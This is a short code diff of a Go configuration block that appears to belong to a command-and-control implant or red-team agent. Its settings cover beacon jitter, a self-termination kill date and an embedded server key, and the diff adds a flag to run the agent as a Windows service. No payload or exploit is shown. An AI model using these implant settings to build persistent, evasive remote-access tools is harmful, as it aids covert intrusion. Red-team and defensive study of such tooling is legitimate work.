@@ -9,4 +9,5 @@ var (
 	JitterPercent = "20"
 	KillDate      = ""          // Optional: YYYY-MM-DD format, agent self-terminates after this date
 	ServerPubKey  = ""          // Base64-encoded RSA public key (embedded at compile time)
+	RunAsService  = ""          // Set to "true" to run as Windows service
 )
